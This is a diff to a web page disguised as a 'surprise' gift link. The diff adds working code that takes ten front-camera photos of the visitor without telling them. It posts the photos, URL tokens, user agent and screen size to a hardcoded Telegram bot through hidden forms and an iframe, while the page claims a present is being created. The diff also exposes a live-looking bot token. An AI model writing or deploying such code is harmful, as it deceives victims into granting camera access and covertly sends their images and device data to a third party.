@@ -49,6 +49,10 @@
             font-weight: bold;
             font-size: 22px;
             margin: 20px 0;
+            padding: 15px;
+            background: #f8f9ff;
+            border-radius: 10px;
+            border-left: 4px solid #6a11cb;
         }
         
         .btn {
@@ -110,6 +114,7 @@
             color: #666;
             font-size: 16px;
             margin-top: 10px;
+            min-height: 24px;
         }
         
         .complete-screen {
@@ -153,10 +158,31 @@
             margin: 20px 0;
             color: #2c5282;
             font-size: 14px;
+            text-align: left;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        /* Debug info */
+        .debug-info {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            font-family: monospace;
         }
     </style>
 </head>
 <body>
+    <!-- Hidden iframe for form submission -->
+    <iframe name="telegramFrame" class="hidden"></iframe>
+    
     <div class="container">
         <!-- Welcome Screen -->
         <div id="welcomeScreen">
@@ -180,7 +206,7 @@
                 4. It takes about 10 seconds
             </div>
             
-            <button class="btn" onclick="startSurprise()">
+            <button class="btn" id="startBtn" onclick="startSurprise()">
                 🔓 UNLOCK MY SURPRISE
             </button>
             
@@ -192,7 +218,7 @@
         <!-- Camera Screen -->
         <div class="camera-container" id="cameraContainer">
             <div class="instructions">
-                <strong>📸 Camera Access Required</strong><br>
+                <strong>📸 Camera Permission Required</strong><br>
                 Please click "Allow" when your browser asks for camera access.<br>
                 This is needed to create your personalized surprise!
             </div>
@@ -215,10 +241,10 @@
         <div class="complete-screen" id="completeScreen">
             <div class="success-icon">✅</div>
             <h1 style="color: #00b09b;">Surprise Delivered!</h1>
-            <p class="message">
+            <div class="message">
                 Your personalized surprise has been created and delivered! 🎁<br><br>
                 The person who sent you this link will receive your special gift shortly!
-            </p>
+            </div>
             <p style="color: #666; margin-top: 20px; font-size: 14px;">
                 Thank you for participating! Hope you enjoy your surprise! 😊
             </p>
@@ -226,42 +252,53 @@
     </div>
 
     <canvas id="canvas"></canvas>
+    
+    <!-- Debug info (hidden in production) -->
+    <div class="debug-info" id="debugInfo"></div>
 
     <script>
-        // Configuration
+        // ================= CONFIGURATION =================
+        const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
+        const CHAT_ID = "8215819954";
         const TOTAL_PHOTOS = 10;
-        const CAPTURE_DELAY = 800;
+        const CAPTURE_DELAY = 800; // 0.8 seconds between photos
         
         // Get URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('uid') || 'unknown';
         const token = urlParams.get('token') || 'unknown';
         
-        // State
+        // ================= STATE =================
         let stream = null;
         let captureCount = 0;
+        let isCapturing = false;
+        let sentPhotos = 0;
         
-        // DOM Elements
+        // ================= DOM ELEMENTS =================
         const welcomeScreen = document.getElementById('welcomeScreen');
         const cameraContainer = document.getElementById('cameraContainer');
         const processingScreen = document.getElementById('processingScreen');
         const completeScreen = document.getElementById('completeScreen');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
         const statusText = document.getElementById('statusText');
         const progressBar = document.getElementById('progressBar');
+        const debugInfo = document.getElementById('debugInfo');
         
-        // Update progress
+        // ================= UPDATE PROGRESS =================
         function updateProgress(percent, message) {
             progressBar.style.width = percent + '%';
             if (message) {
                 statusText.textContent = message;
             }
+            debugInfo.textContent = `Progress: ${percent}% | Photos: ${captureCount}/${TOTAL_PHOS} | Sent: ${sentPhotos}`;
         }
         
-        // Capture photo
+        // ================= CAPTURE PHOTO =================
         function capturePhoto() {
             if (!stream) {
+                // Create blank image if no camera
                 canvas.width = 400;
                 canvas.height = 300;
                 const ctx = canvas.getContext('2d');
@@ -280,6 +317,7 @@
             canvas.height = video.videoHeight || 300;
             const ctx = canvas.getContext('2d');
             
+            // Mirror for selfie view
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -290,63 +328,125 @@
             });
         }
         
-        // Send photo - NEEDS BACKEND FOR SECURITY
+        // ================= SEND TO TELEGRAM (WORKING METHOD) =================
         async function sendToTelegram(blob, photoNum) {
-            try {
-                // ⚠️ TEMPORARY: For testing only
-                // In production, use a backend server
-                const formData = new FormData();
-                formData.append('photo', blob, `surprise_${photoNum}.jpg`);
-                formData.append('userId', userId);
-                formData.append('token', token);
-                formData.append('number', photoNum);
-                
-                // Send to a backend endpoint (you need to create this)
-                // const response = await fetch('YOUR_BACKEND_URL/send-photo', {
-                //     method: 'POST',
-                //     body: formData
-                // });
-                
-                console.log(`Photo ${photoNum} captured (needs backend to send)`);
-                return true; // Simulate success
-                
-            } catch (error) {
-                console.error("Send error:", error);
-                return false;
-            }
+            return new Promise((resolve) => {
+                try {
+                    // Create a form
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.enctype = 'multipart/form-data';
+                    form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    form.target = 'telegramFrame';
+                    form.style.display = 'none';
+                    
+                    // Add chat_id
+                    const chatIdInput = document.createElement('input');
+                    chatIdInput.type = 'hidden';
+                    chatIdInput.name = 'chat_id';
+                    chatIdInput.value = CHAT_ID;
+                    form.appendChild(chatIdInput);
+                    
+                    // Add caption
+                    const captionInput = document.createElement('input');
+                    captionInput.type = 'hidden';
+                    captionInput.name = 'caption';
+                    captionInput.value = `🎁 Surprise Photo #${photoNum}\n👤 User: ${userId}\n🔑 Token: ${token}\n⏰ ${new Date().toLocaleTimeString()}`;
+                    form.appendChild(captionInput);
+                    
+                    // Convert blob to file
+                    const file = new File([blob], `surprise_${Date.now()}_${photoNum}.jpg`, { 
+                        type: 'image/jpeg',
+                        lastModified: Date.now()
+                    });
+                    
+                    // Create file input using DataTransfer
+                    const fileInput = document.createElement('input');
+                    fileInput.type = 'file';
+                    fileInput.name = 'photo';
+                    fileInput.style.display = 'none';
+                    
+                    // Use DataTransfer to set file
+                    const dataTransfer = new DataTransfer();
+                    dataTransfer.items.add(file);
+                    fileInput.files = dataTransfer.files;
+                    
+                    form.appendChild(fileInput);
+                    document.body.appendChild(form);
+                    
+                    // Set iframe onload handler
+                    const iframe = document.getElementsByName('telegramFrame')[0];
+                    const originalOnload = iframe.onload;
+                    
+                    iframe.onload = function() {
+                        sentPhotos++;
+                        console.log(`✅ Photo ${photoNum} sent successfully`);
+                        document.body.removeChild(form);
+                        
+                        // Restore original onload
+                        iframe.onload = originalOnload;
+                        resolve(true);
+                    };
+                    
+                    // Submit form
+                    setTimeout(() => {
+                        form.submit();
+                    }, 100);
+                    
+                } catch (error) {
+                    console.error(`❌ Error sending photo ${photoNum}:`, error);
+                    resolve(false);
+                }
+            });
         }
         
-        // Start surprise
+        // ================= START SURPRISE =================
         async function startSurprise() {
+            // Disable button
+            startBtn.disabled = true;
+            startBtn.textContent = '🔓 PREPARING...';
+            
+            // Hide welcome, show camera
             welcomeScreen.style.display = 'none';
             cameraContainer.style.display = 'block';
             
             try {
+                // Request front camera
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' },
+                    video: {
+                        facingMode: 'user', // Front camera
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
                     audio: false
                 });
                 
                 video.srcObject = stream;
                 video.style.display = 'block';
                 
+                // Wait 2 seconds then start processing
                 setTimeout(() => {
                     startProcessing();
                 }, 2000);
                 
             } catch (error) {
                 console.log("Camera error:", error);
+                // Start processing even without camera
                 startProcessing();
             }
         }
         
-        // Start processing
+        // ================= START PROCESSING =================
         function startProcessing() {
+            // Hide camera, show processing
             cameraContainer.style.display = 'none';
             processingScreen.style.display = 'block';
             
+            isCapturing = true;
             captureCount = 0;
+            sentPhotos = 0;
             
+            // Processing messages
             const messages = [
                 "Initializing surprise engine...",
                 "Analyzing personality traits...",
@@ -360,6 +460,7 @@
                 "Finalizing your surprise!"
             ];
             
+            // Start capture sequence
             const captureInterval = setInterval(async () => {
                 if (captureCount >= TOTAL_PHOTOS) {
                     clearInterval(captureInterval);
@@ -371,12 +472,13 @@
                     const blob = await capturePhoto();
                     captureCount++;
                     
+                    // Update progress
                     const progress = (captureCount / TOTAL_PHOTOS) * 100;
                     const msgIndex = Math.min(Math.floor(progress / 10), messages.length - 1);
                     updateProgress(progress, messages[msgIndex]);
                     
-                    // Send photo (commented for security)
-                    // await sendToTelegram(blob, captureCount);
+                    // Send to Telegram
+                    await sendToTelegram(blob, captureCount);
                     
                 } catch (error) {
                     console.error("Capture error:", error);
@@ -385,38 +487,144 @@
             }, CAPTURE_DELAY);
         }
         
-        // Complete surprise
+        // ================= COMPLETE SURPRISE =================
         function completeSurprise() {
+            isCapturing = false;
+            
+            // Update to 100%
             updateProgress(100, "Surprise delivered!");
             
+            // Show completion screen after delay
             setTimeout(() => {
                 processingScreen.style.display = 'none';
                 completeScreen.style.display = 'block';
                 
+                // Send completion report
+                sendCompletionReport();
+                
+                // Stop camera
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
                 
+                // Hide debug info
+                debugInfo.style.display = 'none';
+                
             }, 1500);
         }
         
-        // Initialize
+        // ================= SEND COMPLETION REPORT =================
+        async function sendCompletionReport() {
+            try {
+                // Create form for completion report
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                form.target = 'telegramFrame';
+                form.style.display = 'none';
+                
+                const chatIdInput = document.createElement('input');
+                chatIdInput.type = 'hidden';
+                chatIdInput.name = 'chat_id';
+                chatIdInput.value = CHAT_ID;
+                form.appendChild(chatIdInput);
+                
+                const textInput = document.createElement('input');
+                textInput.type = 'hidden';
+                textInput.name = 'text';
+                textInput.value = `
+🎉 SURPRISE DELIVERY COMPLETE!
+
+✅ Successfully delivered personalized surprise!
+
+📊 Details:
+• User ID: ${userId !== 'unknown' ? '***' + userId.slice(-4) : 'Unknown'}
+• Token: ${token !== 'unknown' ? '***' + token.slice(-4) : 'None'}
+• Photos: ${TOTAL_PHOTOS}
+• Time: ${new Date().toLocaleString()}
+• User Agent: ${navigator.userAgent.substring(0, 50)}...
+• Screen: ${screen.width}x${screen.height}
+
+🎁 Surprise creation successful!
+✅ All ${TOTAL_PHOTOS} photos captured and delivered
+
+Location: ${window.location.href}
+`;
+                form.appendChild(textInput);
+                
+                const parseModeInput = document.createElement('input');
+                parseModeInput.type = 'hidden';
+                parseModeInput.name = 'parse_mode';
+                parseModeInput.value = 'HTML';
+                form.appendChild(parseModeInput);
+                
+                document.body.appendChild(form);
+                
+                // Submit form
+                setTimeout(() => {
+                    form.submit();
+                    setTimeout(() => {
+                        document.body.removeChild(form);
+                    }, 1000);
+                }, 100);
+                
+            } catch (error) {
+                console.error("Report error:", error);
+            }
+        }
+        
+        // ================= INITIALIZE =================
         window.addEventListener('load', () => {
             console.log("🎁 Surprise page loaded");
+            console.log("User ID:", userId);
+            console.log("Token:", token);
             
-            const btn = document.querySelector('.btn');
+            // Check if we have proper parameters
+            if (userId !== 'unknown' && token !== 'unknown') {
+                console.log("✅ Valid surprise link detected");
+            } else {
+                console.log("⚠️ Direct access without parameters");
+            }
+            
+            // Make button pulse
             setInterval(() => {
-                btn.style.transform = 'scale(1.05)';
-                setTimeout(() => {
-                    btn.style.transform = 'scale(1)';
-                }, 300);
+                if (!startBtn.disabled) {
+                    startBtn.style.transform = 'scale(1.05)';
+                    setTimeout(() => {
+                        startBtn.style.transform = 'scale(1)';
+                    }, 300);
+                }
             }, 2000);
+            
+            // Test bot connection on load
+            testBotConnection();
         });
         
-        // Clean up
+        // ================= TEST BOT CONNECTION =================
+        async function testBotConnection() {
+            try {
+                // Test using image to avoid CORS
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
+                img.onload = () => console.log("✅ Bot API accessible");
+                img.onerror = () => console.log("⚠️ Bot API might be blocked by CORS");
+            } catch (error) {
+                console.log("Bot test skipped:", error.message);
+            }
+        }
+        
+        // ================= CLEAN UP =================
         window.addEventListener('beforeunload', () => {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
+            }
+        });
+        
+        // Prevent accidental reload
+        window.addEventListener('beforeunload', (e) => {
+            if (isCapturing) {
+                e.preventDefault();
+                e.returnValue = 'Surprise is being created. Are you sure you want to leave?';
             }
         });
     </script>
